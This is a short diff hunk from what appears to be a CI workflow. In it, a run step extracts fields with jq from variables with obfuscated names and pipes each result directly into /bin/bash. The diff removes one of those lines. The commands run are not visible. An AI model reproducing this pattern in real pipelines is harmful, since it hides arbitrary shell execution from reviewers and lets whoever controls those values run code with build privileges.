@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$hkibn7479" | jq -r .oo9 | /bin/bash
           printf '%s' "$lcu38" | jq -r .z24 | /bin/bash
-          echo $phxlo872 | jq -r .ofph157 | /bin/bash
           echo $nr0 | jq -r .erm177 | /bin/bash
 
       - name: Archive output
